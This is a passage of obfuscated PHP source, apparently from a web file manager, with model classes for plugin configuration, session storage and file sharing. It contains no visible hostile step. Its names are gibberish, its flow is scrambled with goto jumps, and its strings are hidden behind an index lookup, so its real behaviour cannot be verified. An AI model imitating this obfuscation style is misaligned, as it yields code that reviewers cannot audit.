$e†íğø¼Îë = array($Aö¹£‚åê¸[28] => $d… ¤¨æŞƒ, $Aö¹£‚åê¸[2193] => $E¸±ççÏ™ê, $Aö¹£‚åê¸[691] => 0, $Aö¹£‚åê¸[6] => $this->getConfigDefault($d… ¤¨æŞƒ)); $this->insert($e†íğø¼Îë); } } public function getConfigDefault($B™«»°Áå±) { $D·ãÜÖ¿«Œ =& $_SERVER[í…¶]; $dåµ¼õ±Üğ = array(); $dàí‚Ì‡º  = $this->getPackageJson($B™«»°Áå±); if (!$dàí‚Ì‡º  && is_array($dàí‚Ì‡º [$D·ãÜÖ¿«Œ[2200]])) { return $dåµ¼õ±Üğ; } foreach ($dàí‚Ì‡º [$D·ãÜÖ¿«Œ[2200]] as $F¹ç¹Ãìåƒ => $BìøŞ’¯±¡) { if (!isset($BìøŞ’¯±¡[$D·ãÜÖ¿«Œ[368]]) || isset($dåµ¼õ±Üğ[$F¹ç¹Ãìåƒ])) { continue; } $dåµ¼õ±Üğ[$F¹ç¹Ãìåƒ] = $BìøŞ’¯±¡[$D·ãÜÖ¿«Œ[368]]; } return $dåµ¼õ±Üğ; } public function getPackageJson($F¸˜ò’Œ) { return Hook::apply($F¸˜ò’Œ . $_SERVER[í…¶][2201]); } public function getConfig($Aí•²Í‘ä, $d½º¡Û²¨ = false) { $bŸ‘ƒ‰¥‹ =& $_SERVER[í…¶]; $BòÖäÇï¨Ï = array(); $aˆœá•ëĞ = $this->loadList($Aí•²Í‘ä); if ($aˆœá•ëĞ && is_array($aˆœá•ëĞ[$bŸ‘ƒ‰¥‹[6]])) { $BòÖäÇï¨Ï = $aˆœá•ëĞ[$bŸ‘ƒ‰¥‹[6]]; } if (!$BòÖäÇï¨Ï || $d½º¡Û²¨) { $BòÖäÇï¨Ï = $this->getConfigDefault($Aí•²Í‘ä); } return $BòÖäÇï¨Ï; } public function setConfig($cÂáªçˆÉ¶, $Aè¤Ö™ Ğ› = false) { goto FØ³™Ïå¥…; bß‚ÙÒ›Í‰: $DÓê…Œé‘‘ = $B¸‘ˆ‘¨×…[$aÄÇë‚­ƒŠ[6]]; if ($Aè¤Ö™ Ğ› == !1) { $DÓê…Œé‘‘ = array(); $Aè¤Ö™ Ğ› = $this->getConfigDefault($cÂáªçˆÉ¶); } foreach ($Aè¤Ö™ Ğ› as $F·Ìê•á¹˜ => $A’‹÷‚óˆæ) { $DÓê…Œé‘‘[$F·Ìê•á¹˜] = is_string($A’‹÷‚óˆæ) ? trim($A’‹÷‚óˆæ) : $A’‹÷‚óˆæ; } goto e©¦è–»—Å; FØ³™Ïå¥…: $aÄÇë‚­ƒŠ =& $_SERVER[í…¶]; $B¸‘ˆ‘¨×… = $this->loadList($cÂáªçˆÉ¶); if (!$B¸‘ˆ‘¨×…) { return !1; } goto bß‚ÙÒ›Í‰; e©¦è–»—Å: $this->update($B¸‘ˆ‘¨×…[$aÄÇë‚­ƒŠ[376]], array($aÄÇë‚­ƒŠ[6] => $DÓê…Œé‘‘)); goto CÌ™¤ŠÂ†÷; CÌ™¤ŠÂ†÷: } public function viewList() { goto dË¯Òù¹ò; bÜİÅöõ®: $AÔ Ö—ÅÏ‹ = $this->loadPluginList(); $FØÃ³‰ë‚ó = array(); foreach ($AÔ Ö—ÅÏ‹ as $bŞ°‚ˆ¢¨ => $e£§¦¤ÑŠÁ) { unset($e£§¦¤ÑŠÁ[$b±¡‰÷ê®[2193]], $e£§¦¤ÑŠÁ[$b±¡‰÷ê®[6]]); $cÒ‡èÖ¿— = PLUGIN_DIR . $e£§¦¤ÑŠÁ[$b±¡‰÷ê®[28]] . $b±¡‰÷ê®[2195]; if (!is_file($cÒ‡èÖ¿—)) { continue; } $Föæª¦ö = Hook::apply($e£§¦¤ÑŠÁ[$b±¡‰÷ê®[28]] . $b±¡‰÷ê®[2201]); if (is_array($Föæª¦ö)) { $FØÃ³‰ë‚ó[$bŞ°‚ˆ¢¨] = array_merge($e£§¦¤ÑŠÁ, $Föæª¦ö); } } goto cÔ¯Ôôœ‘İ; cÔ¯Ôôœ‘İ: return $FØÃ³‰ë‚ó; goto dâÛ–°‡ª‡; dË¯Òù¹ò: $b±¡‰÷ê® =& $_SERVER[í…¶]; $AÔ Ö—ÅÏ‹ = $this->loadList(); $this->pluginScan($AÔ Ö—ÅÏ‹); goto bÜİÅöõ®; dâÛ–°‡ª‡: } private function loadPluginList() { $bªñ«øòÏÔ =& $_SERVER[í…¶]; $aœÖŸÍ¸¡“ = $this->loadList(); if (strtolower(MOD) == $bªñ«øòÏÔ[2202]) { return $aœÖŸÍ¸¡“; } $BÖŞÀ»–ˆÌ = Hook::trigger($bªñ«øòÏÔ[2203], $aœÖŸÍ¸¡“); if ($aœÖŸÍ¸¡“ && !$BÖŞÀ»–ˆÌ) { die; } return $BÖŞÀ»–ˆÌ ? $BÖŞÀ»–ˆÌ : $aœÖŸÍ¸¡“; } private function pluginScan($f¤Æ‰å¦¼) { $cëëŒ‚âŸ¼ =& $_SERVER[í…¶]; recursion_dir(PLUGIN_DIR, $B›Ìâóâ¤Í, $E¿Â¨Œ¤££, 0); foreach ($B›Ìâóâ¤Í as $AÏÎ ×­î) { $EŞ¿îñÉãŸ = get_path_this($AÏÎ ×­î); if (isset($f¤Æ‰å¦¼[$EŞ¿îñÉãŸ]) || !file_exists($AÏÎ ×­î . $cëëŒ‚âŸ¼[2204]) || !file_exists($AÏÎ ×­î . $cëëŒ‚âŸ¼[2195])) { continue; } Hook::apply($EŞ¿îñÉãŸ . $cëëŒ‚âŸ¼[2198]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\x5f\x73\x65\x73\163\151\157\x6e"; public function get($CŠ‘Úôˆ) { $BÀ·…‡Ô«ê =& $_SERVER[í…¶]; $b¾ÑÚ…Í³Ä = $this->where(array($BÀ·…‡Ô«ê[2205] => $CŠ‘Úôˆ))->find(); if (!is_array($b¾ÑÚ…Í³Ä)) { return !1; } return $b¾ÑÚ…Í³Ä[$BÀ·…‡Ô«ê[694]]; } public function set($c¸íÅŠÙÑ, $c˜¡é´­ÂÎ, $cã›Ò—¶¯ = 3600) { $b¥µÖ®ÅÇÏ =& $_SERVER[í…¶]; $C¼ä±Õšµô = array($b¥µÖ®ÅÇÏ[2205] => $c¸íÅŠÙÑ, $b¥µÖ®ÅÇÏ[2131] => $c˜¡é´­ÂÎ, $b¥µÖ®ÅÇÏ[2206] => $cã›Ò—¶¯ + time()); if (Session::get($b¥µÖ®ÅÇÏ[2207])) { $C¼ä±Õšµô[$b¥µÖ®ÅÇÏ[1433]] = Session::get($b¥µÖ®ÅÇÏ[2207]); } else { $C¼ä±Õšµô[$b¥µÖ®ÅÇÏ[1433]] = 0; } if ($this->get($c¸íÅŠÙÑ)) { return $this->where(array($b¥µÖ®ÅÇÏ[2205] => $c¸íÅŠÙÑ))->save($C¼ä±Õšµô); } else { return $this->add($C¼ä±Õšµô, array(), !0); } } public function remove($f„ŒÀ¤­µÍ) { return $this->where(array($_SERVER[í…¶][2205] => $f„ŒÀ¤­µÍ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[í…¶][2208] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\145"; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\x54\x69\x6d\x65", "\164\x69\155\145", "\151\x6e\x73\x65\x72\164\54\165\x70\144\x61\x74\145", "\x66\165\156\143\164\x69\x6f\x6e"), array("\143\x72\145\141\x74\x65\x54\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\145\x72\164", "\x66\165\x6e\143\164\151\157\x6e"), array("\x6f\x70\164\151\x6f\x6e\163", '', "\151\x6e\163\145\x72\x74\54\x75\x70\144\x61\x74\x65\54\x73\145\x6c\145\143\164", "\x6a\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($DİœÄÜ‚„ˆ) { $eÔãÆ¾–àô =& $_SERVER[í…¶]; $cÎò’ŒÇö = isset($DİœÄÜ‚„ˆ[0]) ? $DİœÄÜ‚„ˆ[0] : !1; return array($eÔãÆ¾–àô[2209] => array(USER_ID, $eÔãÆ¾–àô[2210]), $eÔãÆ¾–àô[2169] => array($cÎò’ŒÇö, $eÔãÆ¾–àô[2211])); } protected function listSimple() { $F•”„ä•¶ˆ = array($_SERVER[í…¶][1433] => USER_ID); $cÁÏ¿±ÅõÕ = $this->field($this->fieldList)->where($F•”„ä•¶ˆ)->select(); return $cÁÏ¿±ÅõÕ ? $cÁÏ¿±ÅõÕ : array(); } protected function getInfo($a²Ú¸İÔÊ‚, $d÷Ğ²‡èæ¤ = false) { $E’”›º¡á® =& $_SERVER[í…¶]; if ($d÷Ğ²‡èæ¤) { return $this->_getShareInfo(array($E’”›º¡á®[450] => $a²Ú¸İÔÊ‚)); } $F“’š˜—ô = $this->cacheFunctionGet($E’”›º¡á®[2212], $a²Ú¸İÔÊ‚); return $F“’š˜—ô; } public function getInfoByHash($a¾•ÆËÍ¸) { return $this->_getShareInfo(array($_SERVER[í…¶][452] => $a¾•ÆËÍ¸)); } public function getInfoByPath($D™™ˆ‚ñÌ) { $cÊ¿Âˆšî =& $_SERVER[í…¶]; $Aá­£¤‡ƒ = array($cÊ¿Âˆšî[1433] => USER_ID, $cÊ¿Âˆšî[378] => $D™™ˆ‚ñÌ); return $this->_getShareInfo($Aá­£¤‡ƒ); } public function getInfoBySourcePath($dó‰É¡Ùîå) { $AŒôÅÄÚ˜‹ =& $_SERVER[í…¶]; $cƒ‡ä­àø¬ = array($AŒôÅÄÚ˜‹[1433] => USER_ID, $AŒôÅÄÚ˜‹[1017] => $dó‰É¡Ùîå); return $this->_getShareInfo($cƒ‡ä­àø¬); } private function _getShareInfo($d˜ƒ…óƒÛ„) { goto d‡Ã·´è©; d‡Ã·´è©: $aÒ´éíÜÚ¹ =& $_SERVER[í…¶]; $FŠâ¦ÖÓÀø = $this->where($d˜ƒ…óƒÛ„)->find(); if (!$FŠâ¦ÖÓÀø) { return !1; } goto aáŒÁ¶À¢Œ; aáŒÁ¶À¢Œ: $d˜ƒ…óƒÛ„ = array($aÒ´éíÜÚ¹[450] => $FŠâ¦ÖÓÀø[$aÒ´éíÜÚ¹[450]]); $fÖã…˜›éŞ = $aÒ´éíÜÚ¹[2213]; $dÓŒ·äºÒ = Model($aÒ´éíÜÚ¹[546])->order($aÒ´éíÜÚ¹[376])->field($fÖã…˜›éŞ)->where($d˜ƒ…óƒÛ„)->select(); goto EÎØÏ˜µÑÊ; EÎØÏ˜µÑÊ: if ($FŠâ¦ÖÓÀø[$aÒ´éíÜÚ¹[378]] == $aÒ´éíÜÚ¹[477]) { $FŠâ¦ÖÓÀø[$aÒ´éíÜÚ¹[400]] = IO::info($FŠâ¦ÖÓÀø[$aÒ´éíÜÚ¹[1017]]); } else { $FŠâ¦ÖÓÀø[$aÒ´éíÜÚ¹[400]] = Model($aÒ´éíÜÚ¹[1115])->pathInfo($FŠâ¦ÖÓÀø[$aÒ´éíÜÚ¹[378]]); } $FŠâ¦ÖÓÀø[$aÒ´éíÜÚ¹[2214]] = $dÓŒ·äºÒ; return $FŠâ¦ÖÓÀø; goto aˆ·¢•’ª; aˆ·¢•’ª: } protected function getInfoAuth($A²Ç•“ë¹´) { $f‰–™áÉñœ =& $_SERVER[í…¶]; $c§‡’°™ê = $this->getInfo($A²Ç•“ë¹´); $c§‡’°™ê[$f‰–™áÉñœ[385]] = Model($f‰–™áÉñœ[463])->authMake($c§‡’°™ê[$f‰–™áÉñœ[2214]]); return $c§‡’°™ê; } protected function listData($FŒéßáÚÓ¬ = null, $DÎ„Üß²ƒó = 300) { $AŒ£ˆß„Æ =& $_SERVER[í…¶]; $C”šÍŒÉ‡ = array(array($AŒ£ˆß„Æ[455] => array($AŒ£ˆß„Æ[924], 0), $AŒ£ˆß„Æ[457] => array($AŒ£ˆß„Æ[924], 0), $AŒ£ˆß„Æ[2215] => $AŒ£ˆß„Æ[2183])); if ($FŒéßáÚÓ¬ == $AŒ£ˆß„Æ[1867]) { $C”šÍŒÉ‡ = array($AŒ£ˆß„Æ[455] => 1); } else { if ($FŒéßáÚÓ¬ == $AŒ£ˆß„Æ[1006]) { $C”šÍŒÉ‡ = array($AŒ£ˆß„Æ[457] => 1); } } $C”šÍŒÉ‡[$AŒ£ˆß„Æ[1433]] = USER_ID; $Aæ„ëÅ³œ¾ = $this->where($C”šÍŒÉ‡)->selectPage($DÎ„Üß²ƒó); return $Aæ„ëÅ³œ¾; } protected function listToMe($b‡„Ñòòª = 300) { goto a… ˆõ‚Ñƒ; eé­Ç‹Ù˜: $EÔß·…±÷¨ = array_to_keyvalue_group($E³¨ÌŒŠÌ[$E£¡øÙ˜’«[363]], $E£¡øÙ˜’«[450]); if (!$EÔß·…±÷¨) { return $E³¨ÌŒŠÌ; } $CÃÇ’§‡Îò = $E£¡øÙ˜’«[2217]; goto eèÍ–Ã¡Æ; f‡©™ëÛ»: $Aä¨è³…šğ = array($E£¡øÙ˜’«[2218] => $E„‡¨ãµè“, $E£¡øÙ˜’«[2219] => $E³¨ÌŒŠÌ[$E£¡øÙ˜’«[360]]); return $Aä¨è³…šğ; goto A ä‚é¼; dÌ…Õî÷®ˆ: $e¥ÙÄíõ÷ = array($E£¡øÙ˜’«[530] => SourceModel::TYPE_USER, $E£¡øÙ˜’«[465] => USER_ID); if ($CåÄùÅ°ïƒ) { $e¥ÙÄíõ÷ = array(array($E£¡øÙ˜’«[530] => SourceModel::TYPE_USER, $E£¡øÙ˜’«[465] => USER_ID), array($E£¡øÙ˜’«[530] => SourceModel::TYPE_GROUP, $E£¡øÙ˜’«[465] => array($E£¡øÙ˜’«[7], $CåÄùÅ°ïƒ)), $E£¡øÙ˜’«[2215] => $E£¡øÙ˜’«[2183]); } $E³¨ÌŒŠÌ = Model($E£¡øÙ˜’«[546])->where($e¥ÙÄíõ÷)->selectPage($b‡„Ñòòª); goto eé­Ç‹Ù˜; eèÍ–Ã¡Æ: $e¥ÙÄíõ÷ = array($E£¡øÙ˜’«[450] => array($E£¡øÙ˜’«[393], array_keys($EÔß·…±÷¨))); $E„‡¨ãµè“ = $this->field($CÃÇ’§‡Îò)->where($e¥ÙÄíõ÷)->select(); foreach ($E„‡¨ãµè“ as $C™ºùÍ»Ã¤ => &$aŠÉ¥˜ö£Û) { $aŠÉ¥˜ö£Û[$E£¡øÙ˜’«[2214]] = $EÔß·…±÷¨[$aŠÉ¥˜ö£Û[$E£¡øÙ˜’«[450]]]; } goto f‡©™ëÛ»; a… ˆõ‚Ñƒ: $E£¡øÙ˜’« =& $_SERVER[í…¶]; $B˜‚ˆ˜Ö = Session::get($E£¡øÙ˜’«[2216]); $CåÄùÅ°ïƒ = array_to_keyvalue($B˜‚ˆ˜Ö, $E£¡øÙ˜’«[33], $E£¡øÙ˜’«[2101]); goto dÌ…Õî÷®ˆ; A ä‚é¼: } protected function shareAdd($cÀÚ½›À£É, $EÃ¶¼è“İË) { $FèßÃ×•…ò =& $_SERVER[í…¶]; $BÃÃ÷ù±íØ = $this->_addShareData($cÀÚ½›À£É, $EÃ¶¼è“İË); if (!empty($EÃ¶¼è“İË[$FèßÃ×•…ò[2220]])) { $this->_shareAuthSet($BÃÃ÷ù±íØ, $EÃ¶¼è“İË[$FèßÃ×•…ò[2220]]); } $this->shareEventAdd($cÀÚ½›À£É, $EÃ¶¼è“İË, $FèßÃ×•…ò[1009]); return $BÃÃ÷ù±íØ; } private function shareEventAdd($B‘ÙÚ¦Õ‚, $aÄÌÙíªª, $f’ÏÜØÑšœ = "\141\x64\x64") { goto d”’­Òò©á; E’Ğ“Ë÷ï: if ($C”ÃàÖÇ½[$DøŸç…šÃ[457]] == $DøŸç…šÃ[477] && $aÄÌÙíªª[$DøŸç…šÃ[457]] == $DøŸç…šÃ[83]) { $eã‚ßÁíŸ¹ = $DøŸç…šÃ[2222]; } if ($C”ÃàÖÇ½[$DøŸç…šÃ[457]] == $DøŸç…šÃ[83] && $aÄÌÙíªª[$DøŸç…šÃ[457]] == $DøŸç…šÃ[477]) { $eã‚ßÁíŸ¹ = $DøŸç…šÃ[2225]; } Model($DøŸç…šÃ[514])->eventShare($B‘ÙÚ¦Õ‚, $eã‚ßÁíŸ¹); goto B®”Ú‹¢‚á; B®”Ú‹¢‚á: return; goto a’åòâô; D¥ŠßİÎĞ¸: $eã‚ßÁíŸ¹ = $DøŸç…šÃ[2223]; if ($C”ÃàÖÇ½[$DøŸç…šÃ[455]] == $DøŸç…šÃ[477] && $aÄÌÙíªª[$DøŸç…šÃ[455]] == $DøŸç…šÃ[83]) { $eã‚ßÁíŸ¹ = $DøŸç…šÃ[2221]; } if ($C”ÃàÖÇ½[$DøŸç…šÃ[455]] == $DøŸç…šÃ[83] && $aÄÌÙíªª[$DøŸç…šÃ[455]] == $DøŸç…šÃ[477]) { $eã‚ßÁíŸ¹ = $DøŸç…šÃ[2224]; } goto E’Ğ“Ë÷ï; d”’­Òò©á: $DøŸç…šÃ =& $_SERVER[í…¶]; if ($f’ÏÜØÑšœ == $DøŸç…šÃ[1009]) { if ($aÄÌÙíªª[$DøŸç…šÃ[455]] == $DøŸç…šÃ[83]) { Model($DøŸç…šÃ[514])->eventShare($B‘ÙÚ¦Õ‚, $DøŸç…šÃ[2221]); } if ($aÄÌÙíªª[$DøŸç…šÃ[457]] == $DøŸç…šÃ[83]) { Model($DøŸç…šÃ[514])->eventShare($B‘ÙÚ¦Õ‚, $DøŸç…šÃ[2222]); } return; } $C”ÃàÖÇ½ = $this->getInfoByPath($B‘ÙÚ¦Õ‚); goto D¥ŠßİÎĞ¸; a’åòâô: } private function _addShareData($AƒõĞŠ¥†›, $AˆĞï¶å®¹ = array()) { goto D±áæ³Ö”ô; D±áæ³Ö”ô: $E´ÜŒöï¼‘ =& $_SERVER[í…¶]; $Bì¾±¤¾Ã = array($E´ÜŒöï¼‘[392] => $AƒõĞŠ¥†›, $E´ÜŒöï¼‘[1424] => USER_ID); if ($AƒõĞŠ¥†› == 0) { $Bì¾±¤¾Ã = array($E´ÜŒöï¼‘[2226] => $AˆĞï¶å®¹[$E´ÜŒöï¼‘[1017]], $E´ÜŒöï¼‘[1424] => USER_ID); } goto AšÎŒ¦ß™™; CÍ™‚êòõÖ: $CÅá¾šø§ê = array($E´ÜŒöï¼‘[1424] => USER_ID, $E´ÜŒöï¼‘[392] => $AƒõĞŠ¥†›, $E´ÜŒöï¼‘[1339] => $E´ÜŒöï¼‘[33], $E´ÜŒöï¼‘[455] => 0, $E´ÜŒöï¼‘[457] => 0, $E´ÜŒöï¼‘[1017] => $E´ÜŒöï¼‘[33], $E´ÜŒöï¼‘[295] => $E´ÜŒöï¼‘[33], $E´ÜŒöï¼‘[800] => $E´ÜŒöï¼‘[33], $E´ÜŒöï¼‘[2227] => 0, $E´ÜŒöï¼‘[2228] => 0, $E´ÜŒöï¼‘[705] => 0, $E´ÜŒöï¼‘[2229] => $E´ÜŒöï¼‘[33], $E´ÜŒöï¼‘[452] => $E´ÜŒöï¼‘[33]); $e§¶â‘Ó = explode($E´ÜŒöï¼‘[47], $E´ÜŒöï¼‘[2230]); foreach ($e§¶â‘Ó as $BóŠ‡™¤›Ê) { if (!isset($AˆĞï¶å®¹[$BóŠ‡™¤›Ê])) { continue; } $CÅá¾šø§ê[$BóŠ‡™¤›Ê] = $AˆĞï¶å®¹[$BóŠ‡™¤›Ê]; } goto F»ùæ††—¶; CîÓ™…ãù¢: return $fğ£í’§šæ; goto DâÍ–ğÛšÔ; AšÎŒ¦ß™™: if ($c†¾‹Ú¶Ç™ = $this->where($Bì¾±¤¾Ã)->find()) { return $c†¾‹Ú¶Ç™[$E´ÜŒöï¼‘[450]]; } if ($AƒõĞŠ¥†› == 0) { $C½»öŠ™Ú¢ = array($E´ÜŒöï¼‘[28] => get_path_this($AˆĞï¶å®¹[$E´ÜŒöï¼‘[75]])); } else { $C½»öŠ™Ú¢ = Model($E´ÜŒöï¼‘[755])->sourceInfo($AƒõĞŠ¥†›); if (!$C½»öŠ™Ú¢) { return !1; } } if (!$AˆĞï¶å®¹[$E´ÜŒöï¼‘[1339]]) { $AˆĞï¶å®¹[$E´ÜŒöï¼‘[1339]] = $C½»öŠ™Ú¢[$E´ÜŒöï¼‘[28]]; } goto CÍ™‚êòõÖ; F»ùæ††—¶: $fğ£í’§šæ = $this->add($CÅá¾šø§ê); $F×¨‘Òîòœ = array($E´ÜŒöï¼‘[452] => short_id($fğ£í’§šæ)); $this->where(array($E´ÜŒöï¼‘[449] => $fğ£í’§šæ))->save($F×¨‘Òîòœ); goto CîÓ™…ãù¢; DâÍ–ğÛšÔ: } private function _shareAuthSet($aÊà—ìİÀ§, $dî¶°ïî±®) { goto fŸ½Â¨‚ì; eó©š÷¤: return $có–œ·Å„‹->addAll($bÔª…Ÿíˆ·, array(), !0); goto B¸âêµšÌ¤; fŸ½Â¨‚ì: $a¹œğ·—å =& $_SERVER[í…¶]; if (!is_array($dî¶°ïî±®)) { return !1; } $có–œ·Å„‹ = Model($a¹œğ·—å[2231]); goto f²Ô®©‡Ñ; f²Ô®©‡Ñ: $có–œ·Å„‹->where(array($a¹œğ·—å[450] => $aÊà—ìİÀ§))->delete(); $bÔª…Ÿíˆ· = array(); foreach ($dî¶°ïî±® as $BëñÅ³¸) { $A•£ïİ‹ = SourceModel::TYPE_USER; if ($BëñÅ³¸[$a¹œğ·—å[380]] == SourceModel::TYPE_GROUP) { $A•£ïİ‹ = SourceModel::TYPE_GROUP; } $dğ¸µ¨  = array($a¹œğ·—å[450] => $aÊà—ìİÀ§, $a¹œğ·—å[380] => $A•£ïİ‹, $a¹œğ·—å[465] => intval($BëñÅ³¸[$a¹œğ·—å[465]]), $a¹œğ·—å[2232] => 0, $a¹œğ·—å[2233] => -1); if ($BëñÅ³¸[$a¹œğ·—å[2232]]) { $dğ¸µ¨ [$a¹œğ·—å[2232]] = $BëñÅ³¸[$a¹œğ·—å[2232]]; } else { if ($BëñÅ³¸[$a¹œğ·—å[2233]]) { $dğ¸µ¨ [$a¹œğ·—å[2233]] = $BëñÅ³¸[$a¹œğ·—å[2233]]; } } $bÔª…Ÿíˆ·[] = $dğ¸µ¨ ; } goto eó©š÷¤; B¸âêµšÌ¤: } public function numViewAdd($EÁÓ–ÕÍ·›) { $E‡¥î‰‡¨ =& $_SERVER[í…¶]; $a¨‰»´¾’ = array($E‡¥î‰‡¨[449] => $EÁÓ–ÕÍ·›); $this->where($a¨‰»´¾’)->setAdd($E‡¥î‰‡¨[2227]); } public function numDownloadAdd($F‹®ÒÈì¤§) { $f„ÎÉªÉ‰† =& $_SERVER[í…¶]; $F’…Êì¶ùÈ = array($f„ÎÉªÉ‰†[449] => $F‹®ÒÈì¤§); $this->where($F’…Êì¶ùÈ)->setAdd($f„ÎÉªÉ‰†[2228]); } protected function shareEdit($D„ªâ¤Å”á, $dó¼ÄÄ—á°) { goto dºê×Êæ‚; Eâ¾ÏÏ×Õ: $this->_checkLinkShare($dó¼ÄÄ—á°, $F¦ä»ƒ’¹ä); $e¢ôÎÏî‡Ö = array(); $b¾¯¶Ò á‰ = explode($b©±ØÅÎÀá[47], $b©±ØÅÎÀá[2234]); goto F£óÒ¼¾ìİ; dºê×Êæ‚: $b©±ØÅÎÀá =& $_SERVER[í…¶]; $F¦ä»ƒ’¹ä = $this->getInfo($D„ªâ¤Å”á); if (!$F¦ä»ƒ’¹ä) { return !1; } goto Eâ¾ÏÏ×Õ; F£óÒ¼¾ìİ: foreach ($b¾¯¶Ò á‰ as $f½ÊçáŠß) { if (!array_key_exists($f½ÊçáŠß, $dó¼ÄÄ—á°)) { continue; } $e¢ôÎÏî‡Ö[$f½ÊçáŠß] = $dó¼ÄÄ—á°[$f½ÊçáŠß]; } $this->shareEventAdd($F¦ä»ƒ’¹ä[$b©±ØÅÎÀá[378]], $dó¼ÄÄ—á°, $b©±ØÅÎÀá[2068]); $this->where(array($b©±ØÅÎÀá[449] => $D„ªâ¤Å”á))->save($e¢ôÎÏî‡Ö); goto F°±‡Úá½; F°±‡Úá½: if (isset($dó¼ÄÄ—á°[$b©±ØÅÎÀá[2220]])) { $this->_shareAuthSet($D„ªâ¤Å”á, $dó¼ÄÄ—á°[$b©±ØÅÎÀá[2220]]); } return !0; goto E’”‚ô¶; E’”‚ô¶: } private function _checkLinkShare($aÛÂÃ¿É‘, $f¢À¹Ğ°‚‡) { goto F»ÛñÁá‡Ú; D®‡µÙÙÚ…: $eòçì­ÒŞ = $this->shareFileMeta($EƒÕÚ›“ƒ[$D’¼ÆàìÊ˜[428]]); if (isset($eòçì­ÒŞ[$D’¼ÆàìÊ˜[368]]) && $eòçì­ÒŞ[$D’¼ÆàìÊ˜[368]] == $D’¼ÆàìÊ˜[83]) { show_json(LNG($D’¼ÆàìÊ˜[2237]), !1); } goto dÄÌ¨¨î‹©; fŒ”÷´­ØÌ: if ($f¢À¹Ğ°‚‡[$D’¼ÆàìÊ˜[400]][$D’¼ÆàìÊ˜[29]] != $D’¼ÆàìÊ˜[167]) { $B¥»‘Ş = $this->_folderReport($E›¦’Çë´); if (!$B¥»‘Ş) { return; } show_json(LNG($D’¼ÆàìÊ˜[2235]) . $D’¼ÆàìÊ˜[2236] . $B¥»‘Ş, !1); } $EƒÕÚ›“ƒ = Model($D’¼ÆàìÊ˜[755])->fileInfoGet($f¢À¹Ğ°‚‡[$D’¼ÆàìÊ˜[400]][$D’¼ÆàìÊ˜[378]]); if (!$EƒÕÚ›“ƒ) { return; } goto D®‡µÙÙÚ…; F»ÛñÁá‡Ú: $D’¼ÆàìÊ˜ =& $_SERVER[í…¶]; if ($aÛÂÃ¿É‘[$D’¼ÆàìÊ˜[455]] != $D’¼ÆàìÊ˜[83]) { return; } $E›¦’Çë´ = $f¢À¹Ğ°‚‡[$D’¼ÆàìÊ˜[400]][$D’¼ÆàìÊ˜[378]]; goto fŒ”÷´­ØÌ; dÄÌ¨¨î‹©: } private function _folderReport($eóç…Ò‰ºÏ) { goto B·Š‘ñğ·Ü; c‘ò¤©‰÷: $DßºîÑáÛ© = array($cğó¡Áò˜¹[428] => array($cğó¡Áò˜¹[7], $eò¥Á‘§ÈÙ), $cğó¡Áò˜¹[468] => array($cğó¡Áò˜¹[754], "\45{$AğÆÜéçŒê}\x25"), $cğó¡Áò˜¹[406] => 0); $dÚ¬ Ëª› = Model($cğó¡Áò˜¹[755])->where($DßºîÑáÛ©)->field($cğó¡Áò˜¹[2239])->find(); if (!$dÚ¬ Ëª›) { return !1; } goto e·²åê—‰; dæ”Ş¼É¹: if (!$eò¥Á‘§ÈÙ) { return !1; } $eò¥Á‘§ÈÙ = array_to_keyvalue($eò¥Á‘§ÈÙ, $cğó¡Áò˜¹[33], $cğó¡Áò˜¹[428]); $AğÆÜéçŒê = $cğó¡Áò˜¹[47] . $eóç…Ò‰ºÏ . $cğó¡Áò˜¹[47]; goto c‘ò¤©‰÷; B·Š‘ñğ·Ü: $cğó¡Áò˜¹ =& $_SERVER[í…¶]; $DßºîÑáÛ© = array($cğó¡Áò˜¹[428] => array($cğó¡Áò˜¹[924], 0), $cğó¡Áò˜¹[691] => 3); $eò¥Á‘§ÈÙ = Model($cğó¡Áò˜¹[2238])->where($DßºîÑáÛ©)->field($cğó¡Áò˜¹[428])->select(); goto dæ”Ş¼É¹; e·²åê—‰: $Cò•ôè…é = substr($dÚ¬ Ëª›[$cğó¡Áò˜¹[468]], strpos($dÚ¬ Ëª›[$cğó¡Áò˜¹[468]], $AğÆÜéçŒê)); $DßºîÑáÛ© = array($cğó¡Áò˜¹[378] => array($cğó¡Áò˜¹[7], trim($Cò•ôè…é, $cğó¡Áò˜¹[47]))); $E®Úƒ‘ß›µ = Model($cğó¡Áò˜¹[755])->where($DßºîÑáÛ©)->field($cğó¡Áò˜¹[28])->select(); goto Cª¯ŞŒÓ…§; Cª¯ŞŒÓ…§: $cˆİ»ˆ’Ø = array_to_keyvalue($E®Úƒ‘ß›µ, $cğó¡Áò˜¹[33], $cğó¡Áò˜¹[28]); $cˆİ»ˆ’Ø[] = $dÚ¬ Ëª›[$cğó¡Áò˜¹[28]]; return implode($cğó¡Áò˜¹[8], $cˆİ»ˆ’Ø); goto aÄ¿‹ó³ñµ; aÄ¿‹ó³ñµ: } protected function remove($CÀ”¹™­é) { goto cœ‘ÆÜÆ™Ş; cœ‘ÆÜÆ™Ş: $cïÄÇïÄó³ =& $_SERVER[í…¶]; if (is_array($CÀ”¹™­é)) { $CÀ”¹™­é = array($cïÄÇïÄó³[7], $CÀ”¹™­é); } $a½ÆĞè¥ = array($cïÄÇïÄó³[450] => $CÀ”¹™­é); goto Bğ½Ãğêíº; Bğ½Ãğêíº: $f‚æøôŠ¯¦ = $this->where($a½ÆĞè¥)->delete(); if ($f‚æøôŠ¯¦) { Model($cïÄÇïÄó³[546])->where(array($cïÄÇïÄó³[450] => $CÀ”¹™­é))->delete(); } $Dõº«ãç¦í = is_array($CÀ”¹™­é) ? $CÀ”¹™­é[1] : array($CÀ”¹™­é); goto dÔ÷ó‹›ƒì; dÔ÷ó‹›ƒì: for ($EòÓ©Õï ‹ = 0; $EòÓ©Õï ‹ < count($Dõº«ãç¦í); $EòÓ©Õï ‹++) { $c¦õËóëßÑ = $this->getInfo($Dõº«ãç¦í[$EòÓ©Õï ‹]); if ($c¦õËóëßÑ[$cïÄÇïÄó³[457]] == $cïÄÇïÄó³[83]) { Model($cïÄÇïÄó³[514])->eventShare($c¦õËóëßÑ[$cïÄÇïÄó³[378]], $cïÄÇïÄó³[2225]); } if ($c¦õËóëßÑ[$cïÄÇïÄó³[455]] == $cïÄÇïÄó³[83]) { 